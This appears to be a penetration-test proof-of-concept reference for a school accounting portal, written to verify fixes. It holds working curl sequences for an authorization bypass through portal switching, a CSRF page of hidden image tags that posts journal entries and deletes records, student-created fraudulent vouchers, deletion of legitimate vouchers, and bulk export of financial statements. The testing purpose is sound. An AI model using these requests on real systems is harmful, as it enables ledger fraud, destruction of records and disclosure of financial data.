# Accounting Portal — Proof of Concept (PoC) Reference
**Date:** June 11, 2026  
**Module:** Accounting Portal (Gen 1 + AccountingV2)  
**Prerequisites (unless stated):** Any valid login session

---

## PoC Index

| # | ID | Title | Severity | Auth Required |
|---|---|---|---|---|
| 1 | ACC-01 | Accounting middleware bypass via `refid` | CRITICAL | Any login |
| 2 | ACC-02 | Post journal entry via CSRF | HIGH | Accounting user (tricked) |
| 3 | ACC-03 | Student creates journal voucher in AccountingV2 | HIGH | Any login |
| 4 | ACC-04 | Student downloads complete financial statements | HIGH | Any login |

---

## PoC 1 — ACC-01: `isAccounting` Middleware Bypass via `refid == 19` or `refid == 33`

### Background
`AuthenticateAccounting` grants access if `$user->refid == 19 || $user->refid == 33`. By setting `currentPortal` to a `usertype.id` whose `refid` is 19 or 33, any authenticated user gains full accounting access.

### Step 1 — Enumerate `usertype` IDs with `refid = 19` or `refid = 33`
```bash
# Use the Director's unauthenticated passData endpoint (see DIRECTOR_POC.md)
curl -s "http://TARGET/director/passData?action=getemployees" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); [print(p) for e in d for p in e.get('otherportals',[])]"
```
Or enumerate integers directly — `usertype` tables typically have <50 rows:
```bash
for i in $(seq 1 50); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -b "laravel_session=<NON_ACCOUNTING_SESSION>" \
    "http://TARGET/finance/accounting/journalentries?_portal=$i")
  echo "usertype $i: $STATUS"
done
```

### Step 2 — Set `currentPortal` to Matching ID
```bash
curl -s -X POST -b "laravel_session=<NON_ACCOUNTING_SESSION>" \
  "http://TARGET/switchportal" \
  -d "portalid=<USERTYPE_ID_WITH_REFID_19>" \
  -c updated_cookies.txt
```

### Step 3 — Access Accounting Portal
```bash
curl -s -b updated_cookies.txt \
  "http://TARGET/finance/accounting/journalentries" \
  -o je_page.html
grep -i "Journal" je_page.html | head -3
```
**Expected without fix:** HTTP 200, journal entries page loads.  
**Expected with fix:** HTTP 302 redirect to `/home`.

### Alternative — `currentPortal == 15` Bypass
```bash
curl -s -X POST -b "laravel_session=<NON_ACCOUNTING_SESSION>" \
  "http://TARGET/switchportal" \
  -d "portalid=15" \
  -c cookies15.txt

curl -s -b cookies15.txt \
  "http://TARGET/finance/accounting" \
  -o test.html
```
**Expected without fix:** Accounting setup page loads.

---

## PoC 2 — ACC-02: Post Journal Entry via CSRF (No Confirmation, GET Route)

### Background
`GET /finance/accounting/postje?refid=X` is a state-changing route that sets `jestatus = 'Posted'` for any journal entry. No CSRF token required on GET routes.

### Step 1 — Identify an Unposted Journal Entry ID
```bash
curl -s -b "laravel_session=<ACCOUNTING_SESSION>" \
  "http://TARGET/finance/accounting/loadje?daterange=01-01-2026+-+12-31-2026" \
  -H "X-Requested-With: XMLHttpRequest" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('jelist','')[:500])"
# Parse refid (data-id) from the HTML table
```

### Step 2 — Post Journal Entry Without CSRF
```bash
# From any origin, even without the accounting user's session:
curl -s -b "laravel_session=<ACCOUNTING_SESSION>" \
  "http://TARGET/finance/accounting/postje?refid=42" \
  -H "X-Requested-With: XMLHttpRequest"
```
**Expected without fix:** HTTP 200, journal entry 42 is posted (`jestatus = 'Posted'`). The entry is now locked for audit purposes but was posted without the accountant's confirmation.

### Step 3 — CSRF via Malicious Image Tag
Create a webpage and send the link to an accounting user:
```html
<html>
  <body>
    <!-- These load silently when the page is opened -->
    <img src="http://TARGET/finance/accounting/postje?refid=1">
    <img src="http://TARGET/finance/accounting/postje?refid=2">
    <img src="http://TARGET/finance/coa/deleteacctype?dataid=3">
  </body>
</html>
```
When the accounting user opens this page, their browser silently requests all three URLs with their session cookies — posting two journal entries and deleting an account type.

### Step 4 — Delete a Chart of Accounts Entry via CSRF
```bash
# Deletes COA account type ID 1 without CSRF protection:
curl -s -b "laravel_session=<ACCOUNTING_SESSION>" \
  "http://TARGET/finance/coa/deleteacctype?dataid=1" \
  -H "X-Requested-With: XMLHttpRequest"
```
**Expected without fix:** HTTP 200, return value `1` (success). Account type deleted from `acc_coagroup`.

---

## PoC 3 — ACC-03: Student Creates Journal Voucher in AccountingV2

### Background
`POST /accountingv2/journal-voucher-api/` is under `['auth']` only. Any authenticated user can create accounting entries.

### Prerequisites
- Any valid login session (student, teacher, parent)
- CSRF token from any AccountingV2 page

### Step 1 — Get CSRF Token
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/accountingv2/journal-voucher" \
  | grep -oP 'csrf-token" content="\K[^"]*'
CSRF_TOKEN="<extracted_token>"
```

### Step 2 — Create a Journal Voucher as a Student
```bash
curl -s -X POST \
  -b "laravel_session=<STUDENT_SESSION>" \
  -H "X-CSRF-TOKEN: $CSRF_TOKEN" \
  -H "Content-Type: application/json" \
  "http://TARGET/accountingv2/journal-voucher-api/" \
  -d '{
    "voucher_no": "JV-FRAUD-001",
    "date": "2026-06-11",
    "fiscal_year_id": 1,
    "remarks": "Test entry by student",
    "payee": "Student User",
    "entries": [
      {"account_id": 1, "debit": 1000000, "credit": 0},
      {"account_id": 2, "debit": 0, "credit": 1000000}
    ]
  }'
```
**Expected without fix:**
```json
{"success": true, "message": "Saved successfully."}
```
The journal entry is created in `bk_generalledg` with `createdby = <student_user_id>`. It will appear in the general ledger and affect all financial report calculations.

### Step 3 — Verify the Entry Appears in the General Ledger
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/accountingv2/general-ledger-api/?fiscal_year_id=1" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print([r['voucherNo'] for r in d.get('records',[])][:5])"
```
**Expected without fix:** `JV-FRAUD-001` appears in the general ledger alongside legitimate accounting entries.

### Step 4 — Delete a Legitimate Journal Voucher
```bash
curl -s -X POST \
  -b "laravel_session=<STUDENT_SESSION>" \
  -H "X-CSRF-TOKEN: $CSRF_TOKEN" \
  -H "Content-Type: application/json" \
  "http://TARGET/accountingv2/journal-voucher-api/delete" \
  -d '{"voucher_no": "JV-2026-00001"}'
```
**Expected without fix:** Legitimate journal entry `JV-2026-00001` is soft-deleted with the student's user ID as `deletedby`. It no longer appears in any financial report.

---

## PoC 4 — ACC-04: Student Downloads Complete Financial Statements

### Background
All AccountingV2 financial report endpoints are under `['auth']` only.

### Prerequisites
- Any valid login session

### Step 1 — Download Income Statement
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/accountingv2/income-statement-api/export?fiscal_year_id=1" \
  -o income_statement.xlsx

file income_statement.xlsx
# Expected: Microsoft Excel 2007+
```

### Step 2 — Download Balance Sheet
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/accountingv2/balance-sheet-api/export?fiscal_year_id=1" \
  -o balance_sheet.xlsx
```

### Step 3 — Download General Ledger
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/accountingv2/general-ledger-api/export-excel?fiscal_year_id=1" \
  -o general_ledger.xlsx
```

### Step 4 — Enumerate All Available Data
```bash
for ENDPOINT in \
  "income-statement-api/export" \
  "balance-sheet-api/export" \
  "general-ledger-api/export-excel" \
  "trial-balance-api/export" \
  "cashflow-statement-api/export" \
  "equity-statement-api/export"; do

  SIZE=$(curl -s -b "laravel_session=<STUDENT_SESSION>" \
    -o /dev/null -w "%{size_download}" \
    "http://TARGET/accountingv2/${ENDPOINT}?fiscal_year_id=1")
  echo "$ENDPOINT: $SIZE bytes"
done
```
**Expected without fix:** All endpoints return Excel files with complete financial data. Student's session ID is all that's needed.

---

## Remediation Verification Checklist

| PoC | Test After Fix | Expected Result |
|---|---|---|
| PoC 1 (ACC-01) | Set `currentPortal=15` and request `/finance/accounting/journalentries` | HTTP 302 redirect to `/home` |
| PoC 2 (ACC-02) | GET `/finance/accounting/postje?refid=1` | HTTP 405 Method Not Allowed (POST required) |
| PoC 3 (ACC-03) | Student POSTs to `/accountingv2/journal-voucher-api/` | HTTP 403 Unauthorized |
| PoC 4 (ACC-04) | Student GETs `/accountingv2/income-statement-api/export` | HTTP 403 Unauthorized |
